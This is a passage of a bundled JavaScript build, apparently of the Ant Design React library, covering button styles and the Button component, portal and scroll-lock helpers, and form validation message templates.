        [`&${a}-icon-only`]: {
          paddingInline: 0,
          [`&${a}-compact-item`]: { flex: "none" },
          [`&${a}-round`]: { width: "auto" },
        },
        [`&${a}-loading`]: { opacity: tt, cursor: "default" },
        [`${a}-loading-icon`]: {
          transition: ["width", "opacity", "margin"]
            .map((ht) => `${ht} ${nt} ${ot}`)
            .join(","),
        },
        [`&:not(${a}-icon-end)`]: {
          [`${a}-loading-icon-motion`]: {
            "&-appear-start, &-enter-start": {
              marginInlineEnd: ft(st).mul(-1).equal(),
            },
            "&-appear-active, &-enter-active": { marginInlineEnd: 0 },
            "&-leave-start": { marginInlineEnd: 0 },
            "&-leave-active": { marginInlineEnd: ft(st).mul(-1).equal() },
          },
        },
        "&-icon-end": {
          flexDirection: "row-reverse",
          [`${a}-loading-icon-motion`]: {
            "&-appear-start, &-enter-start": {
              marginInlineStart: ft(st).mul(-1).equal(),
            },
            "&-appear-active, &-enter-active": { marginInlineStart: 0 },
            "&-leave-start": { marginInlineStart: 0 },
            "&-leave-active": { marginInlineStart: ft(st).mul(-1).equal() },
          },
        },
      },
    };
  },
  genHoverActiveButtonStyle = (i, a, o) => ({
    [`&:not(:disabled):not(${i}-disabled)`]: { "&:hover": a, "&:active": o },
  }),
  genCircleButtonStyle = (i) => ({
    minWidth: i.controlHeight,
    paddingInlineStart: 0,
    paddingInlineEnd: 0,
    borderRadius: "50%",
  }),
  genRoundButtonStyle = (i) => ({
    borderRadius: i.controlHeight,
    paddingInlineStart: i.calc(i.controlHeight).div(2).equal(),
    paddingInlineEnd: i.calc(i.controlHeight).div(2).equal(),
  }),
  genDisabledStyle$1 = (i) => ({
    cursor: "not-allowed",
    borderColor: i.borderColorDisabled,
    color: i.colorTextDisabled,
    background: i.colorBgContainerDisabled,
    boxShadow: "none",
  }),
  genGhostButtonStyle = (i, a, o, s, tt, nt, ot, st) => ({
    [`&${i}-background-ghost`]: Object.assign(
      Object.assign(
        {
          color: o || void 0,
          background: a,
          borderColor: s || void 0,
          boxShadow: "none",
        },
        genHoverActiveButtonStyle(
          i,
          Object.assign({ background: a }, ot),
          Object.assign({ background: a }, st)
        )
      ),
      {
        "&:disabled": {
          cursor: "not-allowed",
          color: tt || void 0,
          borderColor: nt || void 0,
        },
      }
    ),
  }),
  genSolidDisabledButtonStyle = (i) => ({
    [`&:disabled, &${i.componentCls}-disabled`]: Object.assign(
      {},
      genDisabledStyle$1(i)
    ),
  }),
  genPureDisabledButtonStyle = (i) => ({
    [`&:disabled, &${i.componentCls}-disabled`]: {
      cursor: "not-allowed",
      color: i.colorTextDisabled,
    },
  }),
  genVariantButtonStyle = (i, a, o, s) => {
    const nt =
      s && ["link", "text"].includes(s)
        ? genPureDisabledButtonStyle
        : genSolidDisabledButtonStyle;
    return Object.assign(
      Object.assign({}, nt(i)),
      genHoverActiveButtonStyle(i.componentCls, a, o)
    );
  },
  genSolidButtonStyle = (i, a, o, s, tt) => ({
    [`&${i.componentCls}-variant-solid`]: Object.assign(
      { color: a, background: o },
      genVariantButtonStyle(i, s, tt)
    ),
  }),
  genOutlinedDashedButtonStyle = (i, a, o, s, tt) => ({
    [`&${i.componentCls}-variant-outlined, &${i.componentCls}-variant-dashed`]:
      Object.assign(
        { borderColor: a, background: o },
        genVariantButtonStyle(i, s, tt)
      ),
  }),
  genDashedButtonStyle = (i) => ({
    [`&${i.componentCls}-variant-dashed`]: { borderStyle: "dashed" },
  }),
  genFilledButtonStyle = (i, a, o, s) => ({
    [`&${i.componentCls}-variant-filled`]: Object.assign(
      { boxShadow: "none", background: a },
      genVariantButtonStyle(i, o, s)
    ),
  }),
  genTextLinkButtonStyle = (i, a, o, s, tt) => ({
    [`&${i.componentCls}-variant-${o}`]: Object.assign(
      { color: a, boxShadow: "none" },
      genVariantButtonStyle(i, s, tt, o)
    ),
  }),
  genDefaultButtonStyle = (i) =>
    Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(
              { color: i.defaultColor, boxShadow: i.defaultShadow },
              genSolidButtonStyle(
                i,
                i.solidTextColor,
                i.colorBgSolid,
                { color: i.solidTextColor, background: i.colorBgSolidHover },
                { color: i.solidTextColor, background: i.colorBgSolidActive }
              )
            ),
            genDashedButtonStyle(i)
          ),
          genFilledButtonStyle(
            i,
            i.colorFillTertiary,
            { background: i.colorFillSecondary },
            { background: i.colorFill }
          )
        ),
        genTextLinkButtonStyle(
          i,
          i.textTextColor,
          "link",
          { color: i.colorLinkHover, background: i.linkHoverBg },
          { color: i.colorLinkActive }
        )
      ),
      genGhostButtonStyle(
        i.componentCls,
        i.ghostBg,
        i.defaultGhostColor,
        i.defaultGhostBorderColor,
        i.colorTextDisabled,
        i.colorBorder
      )
    ),
  genPrimaryButtonStyle = (i) =>
    Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(
              { color: i.colorPrimary, boxShadow: i.primaryShadow },
              genOutlinedDashedButtonStyle(
                i,
                i.colorPrimary,
                i.colorBgContainer,
                {
                  color: i.colorPrimaryTextHover,
                  borderColor: i.colorPrimaryHover,
                  background: i.colorBgContainer,
                },
                {
                  color: i.colorPrimaryTextActive,
                  borderColor: i.colorPrimaryActive,
                  background: i.colorBgContainer,
                }
              )
            ),
            genDashedButtonStyle(i)
          ),
          genFilledButtonStyle(
            i,
            i.colorPrimaryBg,
            { background: i.colorPrimaryBgHover },
            { background: i.colorPrimaryBorder }
          )
        ),
        genTextLinkButtonStyle(
          i,
          i.colorLink,
          "text",
          { color: i.colorPrimaryTextHover, background: i.colorPrimaryBg },
          { color: i.colorPrimaryTextActive, background: i.colorPrimaryBorder }
        )
      ),
      genGhostButtonStyle(
        i.componentCls,
        i.ghostBg,
        i.colorPrimary,
        i.colorPrimary,
        i.colorTextDisabled,
        i.colorBorder,
        { color: i.colorPrimaryHover, borderColor: i.colorPrimaryHover },
        { color: i.colorPrimaryActive, borderColor: i.colorPrimaryActive }
      )
    ),
  genDangerousStyle = (i) =>
    Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(
              Object.assign(
                Object.assign(
                  { color: i.colorError, boxShadow: i.dangerShadow },
                  genSolidButtonStyle(
                    i,
                    i.dangerColor,
                    i.colorError,
                    { background: i.colorErrorHover },
                    { background: i.colorErrorActive }
                  )
                ),
                genOutlinedDashedButtonStyle(
                  i,
                  i.colorError,
                  i.colorBgContainer,
                  {
                    color: i.colorErrorHover,
                    borderColor: i.colorErrorBorderHover,
                  },
                  { color: i.colorErrorActive, borderColor: i.colorErrorActive }
                )
              ),
              genDashedButtonStyle(i)
            ),
            genFilledButtonStyle(
              i,
              i.colorErrorBg,
              { background: i.colorErrorBgFilledHover },
              { background: i.colorErrorBgActive }
            )
          ),
          genTextLinkButtonStyle(
            i,
            i.colorError,
            "text",
            { color: i.colorErrorHover, background: i.colorErrorBg },
            { color: i.colorErrorHover, background: i.colorErrorBgActive }
          )
        ),
        genTextLinkButtonStyle(
          i,
          i.colorError,
          "link",
          { color: i.colorErrorHover },
          { color: i.colorErrorActive }
        )
      ),
      genGhostButtonStyle(
        i.componentCls,
        i.ghostBg,
        i.colorError,
        i.colorError,
        i.colorTextDisabled,
        i.colorBorder,
        { color: i.colorErrorHover, borderColor: i.colorErrorHover },
        { color: i.colorErrorActive, borderColor: i.colorErrorActive }
      )
    ),
  genColorButtonStyle = (i) => {
    const { componentCls: a } = i;
    return {
      [`${a}-color-default`]: genDefaultButtonStyle(i),
      [`${a}-color-primary`]: genPrimaryButtonStyle(i),
      [`${a}-color-dangerous`]: genDangerousStyle(i),
    };
  },
  genCompatibleButtonStyle = (i) =>
    Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            {},
            genOutlinedDashedButtonStyle(
              i,
              i.defaultBorderColor,
              i.defaultBg,
              {
                color: i.defaultHoverColor,
                borderColor: i.defaultHoverBorderColor,
                background: i.defaultHoverBg,
              },
              {
                color: i.defaultActiveColor,
                borderColor: i.defaultActiveBorderColor,
                background: i.defaultActiveBg,
              }
            )
          ),
          genTextLinkButtonStyle(
            i,
            i.textTextColor,
            "text",
            { color: i.textTextHoverColor, background: i.textHoverBg },
            { color: i.textTextActiveColor, background: i.colorBgTextActive }
          )
        ),
        genSolidButtonStyle(
          i,
          i.primaryColor,
          i.colorPrimary,
          { background: i.colorPrimaryHover, color: i.primaryColor },
          { background: i.colorPrimaryActive, color: i.primaryColor }
        )
      ),
      genTextLinkButtonStyle(
        i,
        i.colorLink,
        "link",
        { color: i.colorLinkHover, background: i.linkHoverBg },
        { color: i.colorLinkActive }
      )
    ),
  genButtonStyle = function (i) {
    let a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "";
    const {
      componentCls: o,
      controlHeight: s,
      fontSize: tt,
      borderRadius: nt,
      buttonPaddingHorizontal: ot,
      iconCls: st,
      buttonPaddingVertical: ft,
      buttonIconOnlyFontSize: ht,
    } = i;
    return [
      {
        [a]: {
          fontSize: tt,
          height: s,
          padding: `${unit$1(ft)} ${unit$1(ot)}`,
          borderRadius: nt,
          [`&${o}-icon-only`]: {
            width: s,
            [st]: { fontSize: ht, verticalAlign: "calc(-0.125em - 1px)" },
          },
        },
      },
      { [`${o}${o}-circle${a}`]: genCircleButtonStyle(i) },
      { [`${o}${o}-round${a}`]: genRoundButtonStyle(i) },
    ];
  },
  genSizeBaseButtonStyle = (i) => {
    const a = merge(i, { fontSize: i.contentFontSize });
    return genButtonStyle(a, i.componentCls);
  },
  genSizeSmallButtonStyle = (i) => {
    const a = merge(i, {
      controlHeight: i.controlHeightSM,
      fontSize: i.contentFontSizeSM,
      padding: i.paddingXS,
      buttonPaddingHorizontal: i.paddingInlineSM,
      buttonPaddingVertical: 0,
      borderRadius: i.borderRadiusSM,
      buttonIconOnlyFontSize: i.onlyIconSizeSM,
    });
    return genButtonStyle(a, `${i.componentCls}-sm`);
  },
  genSizeLargeButtonStyle = (i) => {
    const a = merge(i, {
      controlHeight: i.controlHeightLG,
      fontSize: i.contentFontSizeLG,
      buttonPaddingHorizontal: i.paddingInlineLG,
      buttonPaddingVertical: 0,
      borderRadius: i.borderRadiusLG,
      buttonIconOnlyFontSize: i.onlyIconSizeLG,
    });
    return genButtonStyle(a, `${i.componentCls}-lg`);
  },
  genBlockButtonStyle = (i) => {
    const { componentCls: a } = i;
    return { [a]: { [`&${a}-block`]: { width: "100%" } } };
  },
  useStyle$4 = genStyleHooks(
    "Button",
    (i) => {
      const a = prepareToken(i);
      return [
        genSharedButtonStyle(a),
        genSizeBaseButtonStyle(a),
        genSizeSmallButtonStyle(a),
        genSizeLargeButtonStyle(a),
        genBlockButtonStyle(a),
        genColorButtonStyle(a),
        genCompatibleButtonStyle(a),
        genGroupStyle$1(a),
      ];
    },
    prepareComponentToken$2,
    {
      unitless: {
        fontWeight: !0,
        contentLineHeight: !0,
        contentLineHeightSM: !0,
        contentLineHeightLG: !0,
      },
    }
  );
function compactItemBorder(i, a, o) {
  const { focusElCls: s, focus: tt, borderElCls: nt } = o,
    ot = nt ? "> *" : "",
    st = ["hover", tt ? "focus" : null, "active"]
      .filter(Boolean)
      .map((ft) => `&:${ft} ${ot}`)
      .join(",");
  return {
    [`&-item:not(${a}-last-item)`]: {
      marginInlineEnd: i.calc(i.lineWidth).mul(-1).equal(),
    },
    "&-item": Object.assign(
      Object.assign(
        { [st]: { zIndex: 2 } },
        s ? { [`&${s}`]: { zIndex: 2 } } : {}
      ),
      { [`&[disabled] ${ot}`]: { zIndex: 0 } }
    ),
  };
}
function compactItemBorderRadius(i, a, o) {
  const { borderElCls: s } = o,
    tt = s ? `> ${s}` : "";
  return {
    [`&-item:not(${a}-first-item):not(${a}-last-item) ${tt}`]: {
      borderRadius: 0,
    },
    [`&-item:not(${a}-last-item)${a}-first-item`]: {
      [`& ${tt}, &${i}-sm ${tt}, &${i}-lg ${tt}`]: {
        borderStartEndRadius: 0,
        borderEndEndRadius: 0,
      },
    },
    [`&-item:not(${a}-first-item)${a}-last-item`]: {
      [`& ${tt}, &${i}-sm ${tt}, &${i}-lg ${tt}`]: {
        borderStartStartRadius: 0,
        borderEndStartRadius: 0,
      },
    },
  };
}
function genCompactItemStyle(i) {
  let a =
    arguments.length > 1 && arguments[1] !== void 0
      ? arguments[1]
      : { focus: !0 };
  const { componentCls: o } = i,
    s = `${o}-compact`;
  return {
    [s]: Object.assign(
      Object.assign({}, compactItemBorder(i, s, a)),
      compactItemBorderRadius(o, s, a)
    ),
  };
}
function compactItemVerticalBorder(i, a) {
  return {
    [`&-item:not(${a}-last-item)`]: {
      marginBottom: i.calc(i.lineWidth).mul(-1).equal(),
    },
    "&-item": {
      "&:hover,&:focus,&:active": { zIndex: 2 },
      "&[disabled]": { zIndex: 0 },
    },
  };
}
function compactItemBorderVerticalRadius(i, a) {
  return {
    [`&-item:not(${a}-first-item):not(${a}-last-item)`]: { borderRadius: 0 },
    [`&-item${a}-first-item:not(${a}-last-item)`]: {
      [`&, &${i}-sm, &${i}-lg`]: {
        borderEndEndRadius: 0,
        borderEndStartRadius: 0,
      },
    },
    [`&-item${a}-last-item:not(${a}-first-item)`]: {
      [`&, &${i}-sm, &${i}-lg`]: {
        borderStartStartRadius: 0,
        borderStartEndRadius: 0,
      },
    },
  };
}
function genCompactItemVerticalStyle(i) {
  const a = `${i.componentCls}-compact-vertical`;
  return {
    [a]: Object.assign(
      Object.assign({}, compactItemVerticalBorder(i, a)),
      compactItemBorderVerticalRadius(i.componentCls, a)
    ),
  };
}
const genButtonCompactStyle = (i) => {
    const { componentCls: a, colorPrimaryHover: o, lineWidth: s, calc: tt } = i,
      nt = tt(s).mul(-1).equal(),
      ot = (st) => ({
        [`${a}-compact${
          st ? "-vertical" : ""
        }-item${a}-primary:not([disabled])`]: {
          "& + &::before": {
            position: "absolute",
            top: st ? nt : 0,
            insetInlineStart: st ? 0 : nt,
            backgroundColor: o,
            content: '""',
            width: st ? "100%" : s,
            height: st ? s : "100%",
          },
        },
      });
    return Object.assign(Object.assign({}, ot()), ot(!0));
  },
  Compact = genSubStyleComponent(
    ["Button", "compact"],
    (i) => {
      const a = prepareToken(i);
      return [
        genCompactItemStyle(a),
        genCompactItemVerticalStyle(a),
        genButtonCompactStyle(a),
      ];
    },
    prepareComponentToken$2
  );
var __rest$8 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
function getLoadingConfig(i) {
  if (typeof i == "object" && i) {
    let a = i == null ? void 0 : i.delay;
    return (
      (a = !Number.isNaN(a) && typeof a == "number" ? a : 0),
      { loading: a <= 0, delay: a }
    );
  }
  return { loading: !!i, delay: 0 };
}
const ButtonTypeMap = {
    default: ["default", "outlined"],
    primary: ["primary", "solid"],
    dashed: ["default", "dashed"],
    link: ["primary", "link"],
    text: ["default", "text"],
  },
  InternalCompoundedButton = React$1.forwardRef((i, a) => {
    var o, s, tt, nt;
    const {
        loading: ot = !1,
        prefixCls: st,
        color: ft,
        variant: ht,
        type: gt,
        danger: St = !1,
        shape: vt = "default",
        size: _t,
        styles: Et,
        disabled: Ct,
        className: Pt,
        rootClassName: bt,
        children: xt,
        icon: yt,
        iconPosition: wt = "start",
        ghost: $t = !1,
        block: kt = !1,
        htmlType: Rt = "button",
        classNames: It,
        style: Ot = {},
        autoInsertSpace: Nt,
        autoFocus: zt,
      } = i,
      Bt = __rest$8(i, [
        "loading",
        "prefixCls",
        "color",
        "variant",
        "type",
        "danger",
        "shape",
        "size",
        "styles",
        "disabled",
        "className",
        "rootClassName",
        "children",
        "icon",
        "iconPosition",
        "ghost",
        "block",
        "htmlType",
        "classNames",
        "style",
        "autoInsertSpace",
        "autoFocus",
      ]),
      Wt = gt || "default",
      [Gt, Vt] = reactExports.useMemo(() => {
        if (ft && ht) return [ft, ht];
        const ur = ButtonTypeMap[Wt] || [];
        return St ? ["danger", ur[1]] : ur;
      }, [gt, ft, ht, St]),
      Ft = Gt === "danger" ? "dangerous" : Gt,
      {
        getPrefixCls: Tt,
        direction: At,
        button: Lt,
      } = reactExports.useContext(ConfigContext),
      jt =
        (o = Nt ?? (Lt == null ? void 0 : Lt.autoInsertSpace)) !== null &&
        o !== void 0
          ? o
          : !0,
      Dt = Tt("btn", st),
      [Ut, Ht, Kt] = useStyle$4(Dt),
      qt = reactExports.useContext(DisabledContext),
      Qt = Ct ?? qt,
      Zt = reactExports.useContext(GroupSizeContext),
      Jt = reactExports.useMemo(() => getLoadingConfig(ot), [ot]),
      [er, sr] = reactExports.useState(Jt.loading),
      [nr, tr] = reactExports.useState(!1),
      Xt = reactExports.useRef(null),
      hr = useComposeRef(a, Xt),
      cr =
        reactExports.Children.count(xt) === 1 &&
        !yt &&
        !isUnBorderedButtonVariant(Vt),
      yr = reactExports.useRef(!0);
    React$1.useEffect(
      () => (
        (yr.current = !1),
        () => {
          yr.current = !0;
        }
      ),
      []
    ),
      reactExports.useEffect(() => {
        let ur = null;
        Jt.delay > 0
          ? (ur = setTimeout(() => {
              (ur = null), sr(!0);
            }, Jt.delay))
          : sr(Jt.loading);
        function lr() {
          ur && (clearTimeout(ur), (ur = null));
        }
        return lr;
      }, [Jt]),
      reactExports.useEffect(() => {
        if (!Xt.current || !jt) return;
        const ur = Xt.current.textContent || "";
        cr && isTwoCNChar(ur) ? nr || tr(!0) : nr && tr(!1);
      }),
      reactExports.useEffect(() => {
        zt && Xt.current && Xt.current.focus();
      }, []);
    const vr = React$1.useCallback(
        (ur) => {
          var lr;
          if (er || Qt) {
            ur.preventDefault();
            return;
          }
          (lr = i.onClick) === null || lr === void 0 || lr.call(i, ur);
        },
        [i.onClick, er, Qt]
      ),
      { compactSize: xr, compactItemClassnames: Sr } = useCompactItemContext(
        Dt,
        At
      ),
      or = { large: "lg", small: "sm", middle: void 0 },
      mr = useSize((ur) => {
        var lr, Fr;
        return (Fr = (lr = _t ?? xr) !== null && lr !== void 0 ? lr : Zt) !==
          null && Fr !== void 0
          ? Fr
          : ur;
      }),
      Yt = mr && (s = or[mr]) !== null && s !== void 0 ? s : "",
      rr = er ? "loading" : yt,
      ar = omit(Bt, ["navigate"]),
      gr = classNames(
        Dt,
        Ht,
        Kt,
        {
          [`${Dt}-${vt}`]: vt !== "default" && vt,
          [`${Dt}-${Wt}`]: Wt,
          [`${Dt}-dangerous`]: St,
          [`${Dt}-color-${Ft}`]: Ft,
          [`${Dt}-variant-${Vt}`]: Vt,
          [`${Dt}-${Yt}`]: Yt,
          [`${Dt}-icon-only`]: !xt && xt !== 0 && !!rr,
          [`${Dt}-background-ghost`]: $t && !isUnBorderedButtonVariant(Vt),
          [`${Dt}-loading`]: er,
          [`${Dt}-two-chinese-chars`]: nr && jt && !er,
          [`${Dt}-block`]: kt,
          [`${Dt}-rtl`]: At === "rtl",
          [`${Dt}-icon-end`]: wt === "end",
        },
        Sr,
        Pt,
        bt,
        Lt == null ? void 0 : Lt.className
      ),
      br = Object.assign(Object.assign({}, Lt == null ? void 0 : Lt.style), Ot),
      Cr = classNames(
        It == null ? void 0 : It.icon,
        (tt = Lt == null ? void 0 : Lt.classNames) === null || tt === void 0
          ? void 0
          : tt.icon
      ),
      Rr = Object.assign(
        Object.assign({}, (Et == null ? void 0 : Et.icon) || {}),
        ((nt = Lt == null ? void 0 : Lt.styles) === null || nt === void 0
          ? void 0
          : nt.icon) || {}
      ),
      Ar =
        yt && !er
          ? React$1.createElement(
              IconWrapper,
              { prefixCls: Dt, className: Cr, style: Rr },
              yt
            )
          : React$1.createElement(LoadingIcon, {
              existIcon: !!yt,
              prefixCls: Dt,
              loading: er,
              mount: yr.current,
            }),
      Ur = xt || xt === 0 ? spaceChildren(xt, cr && jt) : null;
    if (ar.href !== void 0)
      return Ut(
        React$1.createElement(
          "a",
          Object.assign({}, ar, {
            className: classNames(gr, { [`${Dt}-disabled`]: Qt }),
            href: Qt ? void 0 : ar.href,
            style: br,
            onClick: vr,
            ref: hr,
            tabIndex: Qt ? -1 : 0,
          }),
          Ar,
          Ur
        )
      );
    let Ir = React$1.createElement(
      "button",
      Object.assign({}, Bt, {
        type: Rt,
        className: gr,
        style: br,
        onClick: vr,
        disabled: Qt,
        ref: hr,
      }),
      Ar,
      Ur,
      Sr && React$1.createElement(Compact, { prefixCls: Dt })
    );
    return (
      isUnBorderedButtonVariant(Vt) ||
        (Ir = React$1.createElement(
          Wave,
          { component: "Button", disabled: er },
          Ir
        )),
      Ut(Ir)
    );
  }),
  Button = InternalCompoundedButton;
Button.Group = ButtonGroup;
Button.__ANT_BUTTON = !0;
var OrderContext = reactExports.createContext(null),
  EMPTY_LIST = [];
function useDom(i, a) {
  var o = reactExports.useState(function () {
      if (!canUseDom()) return null;
      var Et = document.createElement("div");
      return Et;
    }),
    s = _slicedToArray$1(o, 1),
    tt = s[0],
    nt = reactExports.useRef(!1),
    ot = reactExports.useContext(OrderContext),
    st = reactExports.useState(EMPTY_LIST),
    ft = _slicedToArray$1(st, 2),
    ht = ft[0],
    gt = ft[1],
    St =
      ot ||
      (nt.current
        ? void 0
        : function (Et) {
            gt(function (Ct) {
              var Pt = [Et].concat(_toConsumableArray(Ct));
              return Pt;
            });
          });
  function vt() {
    tt.parentElement || document.body.appendChild(tt), (nt.current = !0);
  }
  function _t() {
    var Et;
    (Et = tt.parentElement) === null || Et === void 0 || Et.removeChild(tt),
      (nt.current = !1);
  }
  return (
    useLayoutEffect(
      function () {
        return i ? (ot ? ot(vt) : vt()) : _t(), _t;
      },
      [i]
    ),
    useLayoutEffect(
      function () {
        ht.length &&
          (ht.forEach(function (Et) {
            return Et();
          }),
          gt(EMPTY_LIST));
      },
      [ht]
    ),
    [tt, St]
  );
}
function measureScrollbarSize(i) {
  var a = "rc-scrollbar-measure-".concat(
      Math.random().toString(36).substring(7)
    ),
    o = document.createElement("div");
  o.id = a;
  var s = o.style;
  (s.position = "absolute"),
    (s.left = "0"),
    (s.top = "0"),
    (s.width = "100px"),
    (s.height = "100px"),
    (s.overflow = "scroll");
  var tt, nt;
  if (i) {
    var ot = getComputedStyle(i);
    (s.scrollbarColor = ot.scrollbarColor),
      (s.scrollbarWidth = ot.scrollbarWidth);
    var st = getComputedStyle(i, "::-webkit-scrollbar"),
      ft = parseInt(st.width, 10),
      ht = parseInt(st.height, 10);
    try {
      var gt = ft ? "width: ".concat(st.width, ";") : "",
        St = ht ? "height: ".concat(st.height, ";") : "";
      updateCSS(
        `
#`
          .concat(
            a,
            `::-webkit-scrollbar {
`
          )
          .concat(
            gt,
            `
`
          )
          .concat(
            St,
            `
}`
          ),
        a
      );
    } catch (Et) {
      console.error(Et), (tt = ft), (nt = ht);
    }
  }
  document.body.appendChild(o);
  var vt = i && tt && !isNaN(tt) ? tt : o.offsetWidth - o.clientWidth,
    _t = i && nt && !isNaN(nt) ? nt : o.offsetHeight - o.clientHeight;
  return document.body.removeChild(o), removeCSS(a), { width: vt, height: _t };
}
function getTargetScrollBarSize(i) {
  return typeof document > "u" || !i || !(i instanceof Element)
    ? { width: 0, height: 0 }
    : measureScrollbarSize(i);
}
function isBodyOverflowing() {
  return (
    document.body.scrollHeight >
      (window.innerHeight || document.documentElement.clientHeight) &&
    window.innerWidth > document.body.offsetWidth
  );
}
var UNIQUE_ID = "rc-util-locker-".concat(Date.now()),
  uuid$1 = 0;
function useScrollLocker(i) {
  var a = !!i,
    o = reactExports.useState(function () {
      return (uuid$1 += 1), "".concat(UNIQUE_ID, "_").concat(uuid$1);
    }),
    s = _slicedToArray$1(o, 1),
    tt = s[0];
  useLayoutEffect(
    function () {
      if (a) {
        var nt = getTargetScrollBarSize(document.body).width,
          ot = isBodyOverflowing();
        updateCSS(
          `
html body {
  overflow-y: hidden;
  `.concat(
            ot ? "width: calc(100% - ".concat(nt, "px);") : "",
            `
}`
          ),
          tt
        );
      } else removeCSS(tt);
      return function () {
        removeCSS(tt);
      };
    },
    [a, tt]
  );
}
var inline = !1;
function inlineMock(i) {
  return inline;
}
var getPortalContainer = function (a) {
    return a === !1
      ? !1
      : !canUseDom() || !a
      ? null
      : typeof a == "string"
      ? document.querySelector(a)
      : typeof a == "function"
      ? a()
      : a;
  },
  Portal = reactExports.forwardRef(function (i, a) {
    var o = i.open,
      s = i.autoLock,
      tt = i.getContainer;
    i.debug;
    var nt = i.autoDestroy,
      ot = nt === void 0 ? !0 : nt,
      st = i.children,
      ft = reactExports.useState(o),
      ht = _slicedToArray$1(ft, 2),
      gt = ht[0],
      St = ht[1],
      vt = gt || o;
    reactExports.useEffect(
      function () {
        (ot || o) && St(o);
      },
      [o, ot]
    );
    var _t = reactExports.useState(function () {
        return getPortalContainer(tt);
      }),
      Et = _slicedToArray$1(_t, 2),
      Ct = Et[0],
      Pt = Et[1];
    reactExports.useEffect(function () {
      var zt = getPortalContainer(tt);
      Pt(zt ?? null);
    });
    var bt = useDom(vt && !Ct),
      xt = _slicedToArray$1(bt, 2),
      yt = xt[0],
      wt = xt[1],
      $t = Ct ?? yt;
    useScrollLocker(
      s && o && canUseDom() && ($t === yt || $t === document.body)
    );
    var kt = null;
    if (st && supportRef(st) && a) {
      var Rt = st;
      kt = Rt.ref;
    }
    var It = useComposeRef(kt, a);
    if (!vt || !canUseDom() || Ct === void 0) return null;
    var Ot = $t === !1 || inlineMock(),
      Nt = st;
    return (
      a && (Nt = reactExports.cloneElement(st, { ref: It })),
      reactExports.createElement(
        OrderContext.Provider,
        { value: wt },
        Ot ? Nt : reactDomExports.createPortal(Nt, $t)
      )
    );
  });
function getUseId() {
  var i = _objectSpread2$1({}, React$2);
  return i.useId;
}
var uuid = 0,
  useOriginId = getUseId();
const useId = useOriginId
  ? function (a) {
      var o = useOriginId();
      return a || o;
    }
  : function (a) {
      var o = reactExports.useState("ssr-id"),
        s = _slicedToArray$1(o, 2),
        tt = s[0],
        nt = s[1];
      return (
        reactExports.useEffect(function () {
          var ot = uuid;
          (uuid += 1), nt("rc_unique_".concat(ot));
        }, []),
        a || tt
      );
    };
var HOOK_MARK = "RC_FORM_INTERNAL_HOOKS",
  warningFunc = function () {
    warningOnce(
      !1,
      "Can not find FormContext. Please make sure you wrap Field under Form."
    );
  },
  Context = reactExports.createContext({
    getFieldValue: warningFunc,
    getFieldsValue: warningFunc,
    getFieldError: warningFunc,
    getFieldWarning: warningFunc,
    getFieldsError: warningFunc,
    isFieldsTouched: warningFunc,
    isFieldTouched: warningFunc,
    isFieldValidating: warningFunc,
    isFieldsValidating: warningFunc,
    resetFields: warningFunc,
    setFields: warningFunc,
    setFieldValue: warningFunc,
    setFieldsValue: warningFunc,
    validateFields: warningFunc,
    submit: warningFunc,
    getInternalHooks: function () {
      return (
        warningFunc(),
        {
          dispatch: warningFunc,
          initEntityValue: warningFunc,
          registerField: warningFunc,
          useSubscribe: warningFunc,
          setInitialValues: warningFunc,
          destroyForm: warningFunc,
          setCallbacks: warningFunc,
          registerWatch: warningFunc,
          getFields: warningFunc,
          setValidateMessages: warningFunc,
          setPreserve: warningFunc,
          getInitialValue: warningFunc,
        }
      );
    },
  }),
  ListContext = reactExports.createContext(null);
function toArray$1(i) {
  return i == null ? [] : Array.isArray(i) ? i : [i];
}
function isFormInstance(i) {
  return i && !!i._init;
}
function newMessages() {
  return {
    default: "Validation error on field %s",
    required: "%s is required",
    enum: "%s must be one of %s",
    whitespace: "%s cannot be empty",
    date: {
      format: "%s date %s is invalid for format %s",
      parse: "%s date could not be parsed, %s is invalid ",
      invalid: "%s date %s is invalid",
    },
    types: {
      string: "%s is not a %s",
      method: "%s is not a %s (function)",
      array: "%s is not an %s",
      object: "%s is not an %s",
      number: "%s is not a %s",
      date: "%s is not a %s",
      boolean: "%s is not a %s",
      integer: "%s is not an %s",
      float: "%s is not a %s",
      regexp: "%s is not a valid %s",
      email: "%s is not a valid %s",
      url: "%s is not a valid %s",
      hex: "%s is not a valid %s",
    },
    string: {
      len: "%s must be exactly %s characters",
      min: "%s must be at least %s characters",
      max: "%s cannot be longer than %s characters",
      range: "%s must be between %s and %s characters",
    },
    number: {
      len: "%s must equal %s",
      min: "%s cannot be less than %s",
      max: "%s cannot be greater than %s",
      range: "%s must be between %s and %s",
    },
    array: {
      len: "%s must be exactly %s in length",
      min: "%s cannot be less than %s in length",
      max: "%s cannot be greater than %s in length",
      range: "%s must be between %s and %s in length",
    },
    pattern: { mismatch: "%s value %s does not match pattern %s" },
    clone: function () {
      var a = JSON.parse(JSON.stringify(this));
      return (a.clone = this.clone), a;
    },
  };
}
var messages = newMessages();
function _isNativeFunction(i) {
  try {
    return Function.toString.call(i).indexOf("[native code]") !== -1;
  } catch {
    return typeof i == "function";
  }
}
function _construct(i, a, o) {
  if (_isNativeReflectConstruct())
    return Reflect.construct.apply(null, arguments);
  var s = [null];
  s.push.apply(s, a);
  var tt = new (i.bind.apply(i, s))();
  return o && _setPrototypeOf(tt, o.prototype), tt;
}
function _wrapNativeSuper(i) {
  var a = typeof Map == "function" ? new Map() : void 0;
  return (
    (_wrapNativeSuper = function (s) {
      if (s === null || !_isNativeFunction(s)) return s;
      if (typeof s != "function")
        throw new TypeError(
          "Super expression must either be null or a function"
        );
      if (a !== void 0) {
        if (a.has(s)) return a.get(s);
        a.set(s, tt);
      }
      function tt() {
        return _construct(s, arguments, _getPrototypeOf(this).constructor);
      }
      return (
        (tt.prototype = Object.create(s.prototype, {
          constructor: {
            value: tt,
            enumerable: !1,
            writable: !0,
            configurable: !0,
